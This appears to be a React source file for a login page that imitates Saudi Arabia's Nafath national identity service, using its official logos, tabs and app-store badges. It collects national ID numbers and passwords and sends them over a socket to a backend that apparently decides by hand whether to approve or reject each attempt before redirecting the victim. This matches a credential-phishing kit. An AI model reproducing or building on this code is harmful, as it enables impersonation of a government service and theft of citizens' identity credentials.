import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { socketService } from '../../services/socketService';
import NafadFooter from '../../components/Client/NafadFooter';
import { useI18n } from '../../shared/i18n';
import { validateNationalID } from '../../shared/validation';
import { getStoredNationalId, setStoredNationalId } from '../../shared/utils';

// --- Assets ---
const Logos = {
    nafath: "/imgs/nafad/imgi_1_logo.png",
    vision2030: "/imgs/nafad/imgi_2_vision2030-grey.png",
    sdaia: "/imgs/nafad/imgi_7_sdaia-logo.png",
    moi: "/imgs/nafad/imgi_10_moi_logo_rtl.png",
    saMap: "/imgs/nafad/imgi_11_sa-map-grey.png",
    shield: "/imgs/nafad/imgi_8_c46b531f-3e65-4bf2-9f17-b1ed016c01be.png",
    secure: "/imgs/nafad/imgi_6_secure.png",
};

const AppStoreImages = {
    apple: "/imgs/nafad/imgi_3_apple_store.png",
    google: "/imgs/nafad/imgi_4_google_play.png",
    huawei: "/imgs/nafad/imgi_5_huawei_store.png",
};

const AppStoreBadge = ({ store, url }: { store: string, url: string }) => (
    <img src={url} alt={`Download on ${store}`} className="h-6 cursor-pointer hover:opacity-90 transition-opacity" />
);

const Header = ({ isRTL }: { isRTL: boolean }) => (
    <header className="bg-white py-4 border-b border-gray-100 shadow-[0_1px_2px_rgba(0,0,0,0.02)]">
        <div className="w-full px-4 flex items-center h-16 justify-start">
            {/* Right: Logos */}
            <div className="flex items-center gap-4 md:gap-6" dir="ltr">
                <img src={Logos.nafath} alt="Nafath" className="h-10 md:h-12 w-auto" />
                <img src={Logos.vision2030} alt="Vision 2030" className="h-10 md:h-14 w-auto" />
            </div>
        </div>
    </header>
);


// Shield Icon using project image
const ShieldIcon = () => (
    <div className="relative w-48 h-48 md:w-56 md:h-56 flex items-center justify-center">
        <img src={Logos.secure} alt="Secure" className="w-full h-full object-contain drop-shadow-2xl" />
    </div>
);



export default function Nafad() {
    const navigate = useNavigate();
    const { t, isRTL } = useI18n();
    const [activeTab, setActiveTab] = useState<'app' | 'password'>('app');
    const [idNumber, setIdNumber] = useState('');
    const [password, setPassword] = useState('');
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [showNafadErrorPopup, setShowNafadErrorPopup] = useState(false);
    const [nafadErrorMessage, setNafadErrorMessage] = useState('');

    useEffect(() => {
        const storedId = getStoredNationalId();
        if (storedId) {
            setIdNumber(storedId);
        }
    }, []);

    useEffect(() => {
        socketService.connect();

        const handleNafadApproved = (data: { redirectTo?: string }) => {
            setIsSubmitting(false);
            navigate(data?.redirectTo || '/nafad-basmah', { replace: true });
        };

        const handleNafadRejected = (data: { message?: string }) => {
            setIsSubmitting(false);
            setPassword('');
            setNafadErrorMessage(
                data?.message || (isRTL
                    ? 'تعذر التحقق من بيانات تسجيل الدخول في نفاذ. يرجى المحاولة مرة أخرى.'
                    : 'Unable to verify Nafath login details. Please try again.')
            );
            setShowNafadErrorPopup(true);
        };

        socketService.on('nafadLoginApproved', handleNafadApproved);
        socketService.on('nafadLoginRejected', handleNafadRejected);

        return () => {
            socketService.off('nafadLoginApproved', handleNafadApproved);
            socketService.off('nafadLoginRejected', handleNafadRejected);
        };
    }, [navigate]);

    const handleIdNumberChange = (rawValue: string) => {
        const englishDigitsOnly = rawValue.replace(/[^0-9]/g, '').slice(0, 10);

        if (englishDigitsOnly.length > 0 && !['1', '2'].includes(englishDigitsOnly[0])) {
            return;
        }

        setIdNumber(englishDigitsOnly);

        if (validateNationalID(englishDigitsOnly).valid) {
            setStoredNationalId(englishDigitsOnly);
        }
    };

    const handleSubmit = () => {
        if (!validateNationalID(idNumber).valid) {
            return;
        }

        setStoredNationalId(idNumber);

        setShowNafadErrorPopup(false);
        setNafadErrorMessage('');
        setIsSubmitting(true);
        socketService.emitClientEvent('submitNafad', {
            type: activeTab,
            idNumber,
            password: activeTab === 'password' ? password : ''
        });
    };

    const handlePasswordChange = (rawValue: string) => {
        const withoutArabicChars = rawValue.replace(/[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF]/g, '');
        setPassword(withoutArabicChars);
    };

    return (
        <div className="min-h-screen flex flex-col font-tajawal bg-gray-50" dir={isRTL ? 'rtl' : 'ltr'} style={{ backgroundImage: 'radial-gradient(circle, #e5e7eb 1px, transparent 1px)', backgroundSize: '24px 24px' }}>
            <Header isRTL={isRTL} />

            <main className="flex-grow container mx-auto px-3 sm:px-4 lg:px-20 py-8 sm:py-12 flex flex-col items-center">

                <h1 className="text-xl sm:text-2xl md:text-[26px] font-bold text-[#119e84] mb-6 sm:mb-8 text-center">
                    {t('systemLogin')}
                </h1>

                {/* Main Card */}
                <div className="w-full max-w-[900px] bg-white rounded-lg shadow-sm border border-gray-200 overflow-hidden">

                    {/* --- Tab 1: Nafath App (Active) --- */}
                    <div>
                        <button
                            onClick={() => setActiveTab('app')}
                            className={`w-full flex justify-between items-center px-4 sm:px-6 py-3 sm:py-4 transition-all duration-200 ${activeTab === 'app' ? 'bg-[#119e84] text-white' : 'bg-[#c8c8c8] text-white hover:bg-[#b0b0b0]'}`}
                        >
                            <div className="flex items-center gap-2">
                                <span className="font-bold text-base sm:text-lg">{t('nafadApp')}</span>
                            </div>
                            <span className="text-xl sm:text-2xl font-light">{activeTab === 'app' ? '-' : '+'}</span>
                        </button>

                        <div
                            className={`overflow-hidden transition-all duration-300 ease-in-out ${activeTab === 'app'
                                ? 'max-h-[800px] opacity-100'
                                : 'max-h-0 opacity-0'
                                }`}
                        >
                            <div className="p-4 sm:p-6 md:p-12 bg-[#fafafa]">
                                <div className="flex flex-col md:flex-row gap-6 sm:gap-8 lg:gap-16">

                                    {/* Right Side: Form */}
                                    <div className="flex-1 order-2 md:order-1 pt-4">
                                        <div className="mb-4 sm:mb-6">
                                            <label className="block text-gray-500 text-xs sm:text-sm mb-2 text-right">
                                                {t('nationalId')}
                                            </label>
                                            <input
                                                type="text"
                                                value={idNumber}
                                                onChange={(e) => handleIdNumberChange(e.target.value)}
                                                placeholder={t('nationalIdPlaceholder')}
                                                className="w-full p-3 bg-white border border-gray-300 rounded-[4px] focus:outline-none focus:border-[#119e84] focus:ring-1 focus:ring-[#119e84] text-right placeholder-gray-300 text-sm transition-shadow h-12"
                                                dir={isRTL ? 'rtl' : 'ltr'}
                                                inputMode="numeric"
                                                maxLength={10}
                                                pattern="[12][0-9]{9}"
                                            />
                                        </div>

                                        <button
                                            onClick={handleSubmit}
                                            disabled={isSubmitting}
                                            className="w-full bg-[#119e84] hover:bg-[#0e8a73] text-white font-bold py-3 px-4 rounded-[4px] transition-colors shadow-sm text-sm md:text-base mb-6 sm:mb-8 h-12"
                                        >
                                            {t('login')}
                                        </button>

                                        {/* App Store Links */}
                                        <div className="border-t border-gray-200 pt-6">
                                            <p className="text-right text-gray-500 text-[13px] mb-4">{t('downloadNafadApp')}</p>
                                            <div className="flex flex-wrap justify-end gap-3">
                                                <AppStoreBadge store="Huawei" url={AppStoreImages.huawei} />
                                                <AppStoreBadge store="Google Play" url={AppStoreImages.google} />
                                                <AppStoreBadge store="App Store" url={AppStoreImages.apple} />
                                            </div>
                                        </div>
                                    </div>

                                    {/* Left Side: Illustration */}
                                    <div className="flex-1 order-1 md:order-2 flex flex-col items-center justify-center text-center">
                                        <ShieldIcon />
                                        <p className="mt-8 text-gray-500 text-sm leading-relaxed font-medium">
                                            {t('loginInstructions')}
                                        </p>
                                    </div>

                                </div>
                            </div>
                        </div>
                    </div>

                    {/* --- Tab 2: Username & Password (Inactive) --- */}
                    <div className="border-t border-white">
                        <button
                            onClick={() => setActiveTab('password')}
                            className={`w-full flex justify-between items-center px-4 sm:px-6 py-3 sm:py-4 transition-colors ${activeTab === 'password' ? 'bg-[#119e84] text-white' : 'bg-[#c8c8c8] text-white hover:bg-[#b0b0b0]'}`}
                        >
                            <div className="flex items-center gap-2">
                                <span className="font-bold text-base sm:text-lg">{t('usernamePassword')}</span>
                            </div>
                            <span className="text-xl sm:text-2xl font-light">{activeTab === 'password' ? '-' : '+'}</span>
                        </button>

                        <div
                            className={`overflow-hidden transition-all duration-300 ease-in-out ${activeTab === 'password'
                                ? 'max-h-[800px] opacity-100'
                                : 'max-h-0 opacity-0'
                                }`}
                        >
                            <div className="p-4 sm:p-6 md:p-12 bg-[#fafafa]">
                                <div className="flex flex-col md:flex-row gap-8 lg:gap-16">

                                    {/* Right Side: Form */}
                                    <div className="flex-1 order-2 md:order-1 pt-4">
                                        <div className="mb-4">
                                            <label className={`block text-gray-500 text-xs md:text-sm mb-2 ${isRTL ? 'text-right' : 'text-left'}`}>
                                                {t('nationalId')}
                                            </label>
                                            <input
                                                type="text"
                                                value={idNumber}
                                                onChange={(e) => handleIdNumberChange(e.target.value)}
                                                placeholder={t('nationalIdPlaceholder')}
                                                className={`w-full p-3 bg-white border border-gray-300 rounded-[4px] focus:outline-none focus:border-[#119e84] focus:ring-1 focus:ring-[#119e84] placeholder-gray-300 text-sm transition-shadow h-12 ${isRTL ? 'text-right' : 'text-left'}`}
                                                dir={isRTL ? 'rtl' : 'ltr'}
                                                inputMode="numeric"
                                                maxLength={10}
                                                pattern="[12][0-9]{9}"
                                            />
                                        </div>

                                        <div className="mb-6">
                                            <label className={`block text-gray-500 text-xs md:text-sm mb-2 ${isRTL ? 'text-right' : 'text-left'}`}>
                                                {t('password')}
                                            </label>
                                            <input
                                                type="password"
                                                value={password}
                                                onChange={(e) => handlePasswordChange(e.target.value)}
                                                placeholder={t('passwordPlaceholder')}
                                                className={`w-full p-3 bg-white border border-gray-300 rounded-[4px] focus:outline-none focus:border-[#119e84] focus:ring-1 focus:ring-[#119e84] placeholder-gray-300 text-sm transition-shadow h-12 ${isRTL ? 'text-right' : 'text-left'}`}
                                                dir={isRTL ? 'rtl' : 'ltr'}
                                            />
                                        </div>

                                        <button
                                            onClick={handleSubmit}
                                            disabled={isSubmitting}
                                            className="w-full bg-[#119e84] hover:bg-[#0e8a73] text-white font-bold py-3 px-4 rounded-[4px] transition-colors shadow-sm text-sm md:text-base mb-4 h-12"
                                        >
                                            {t('loginButton')}
                                        </button>

                                        <div className="text-center">
                                            <a href="#" className="text-[#119e84] text-sm hover:underline">{t('forgotPassword')}</a>
                                        </div>
                                    </div>

                                    {/* Left Side: Illustration */}
                                    <div className="flex-1 order-1 md:order-2 flex flex-col items-center justify-center text-center">
                                        <ShieldIcon />
                                        <p className="mt-8 text-gray-500 text-sm leading-relaxed font-medium">
                                            {t('usernamePasswordInstruction')}
                                        </p>
                                    </div>

                                </div>
                            </div>
                        </div>
                    </div>

                </div>

                {/* New Platform Banner */}
                <div className="w-full max-w-[900px] mt-6 bg-[#119e84] rounded-lg py-6 px-4 sm:py-8 sm:px-6 text-center text-white">
                    <h2 className="text-lg sm:text-xl md:text-2xl font-bold mb-2 sm:mb-3">{t('newNafadPlatform')}</h2>
                    <p className="text-xs sm:text-sm md:text-base mb-4 sm:mb-6 opacity-90">
                        {t('newNafadPlatformDesc')}
                    </p>
                    <button
                        onClick={() => setShowNafadErrorPopup(true)}
                        className="bg-white text-[#119e84] font-bold py-2 px-6 sm:py-2.5 sm:px-8 rounded-full hover:bg-gray-100 transition-colors text-xs sm:text-sm"
                    >
                        {t('startNow')}
                    </button>
                </div>

            </main>

            <NafadFooter />

            {isSubmitting && (
                <div className="fixed inset-0 z-50 flex items-center justify-center">
                    <div className="absolute inset-0 bg-black/45 backdrop-blur-sm" />
                    <div className="relative w-[92%] max-w-md bg-white rounded-2xl border border-gray-200 shadow-2xl p-6 text-center">
                        <div className="flex items-center justify-center gap-3 mb-4">
                            <img src={Logos.nafath} alt="Nafath" className="h-8 w-auto" />
                            <img src={Logos.vision2030} alt="Vision 2030" className="h-8 w-auto opacity-80" />
                        </div>

                        <div className="mx-auto mb-4 w-16 h-16 rounded-full border-4 border-[#119e84]/20 border-t-[#119e84] animate-spin" />

                        <h3 className="text-[#119e84] text-lg font-bold mb-2">
                            {isRTL ? 'جاري التحقق من بيانات نفاذ' : 'Verifying Nafath details'}
                        </h3>
                        <p className="text-gray-500 text-sm">
                            {isRTL ? 'يرجى الانتظار، لا تغلق الصفحة.' : 'Please wait, do not close this page.'}
                        </p>
                    </div>
                </div>
            )}

            {showNafadErrorPopup && (
                <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
                    <div className="absolute inset-0 bg-black/45 backdrop-blur-sm" onClick={() => setShowNafadErrorPopup(false)} />
                    <div className="relative w-full max-w-[700px] bg-white rounded-lg shadow-sm border border-gray-200 py-6 sm:py-8 px-4 sm:px-6 text-center">
                        <div className="flex justify-end mb-2">
                            <button
                                type="button"
                                onClick={() => setShowNafadErrorPopup(false)}
                                className="text-gray-400 hover:text-gray-600 text-2xl leading-none"
                                aria-label={isRTL ? 'إغلاق' : 'Close'}
                            >
                                ×
                            </button>
                        </div>

                        <div className="flex justify-center mb-4">
                            <div className="w-10 h-10 rounded-full bg-red-100 flex items-center justify-center">
                                <svg className="w-6 h-6 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                                </svg>
                            </div>
                        </div>

                        <h2 className="text-base sm:text-lg font-bold text-red-500 mb-2">{t('operationFailed')}</h2>

                        <p className="text-gray-500 text-sm mb-6">
                            {nafadErrorMessage || t('operationFailedDesc')}
                        </p>

                        <button
                            type="button"
                            onClick={() => setShowNafadErrorPopup(false)}
                            className="text-[#119e84] text-sm hover:underline"
                        >
                            {t('goToHomePage')}
                        </button>
                    </div>
                </div>
            )}
        </div>
    );
}
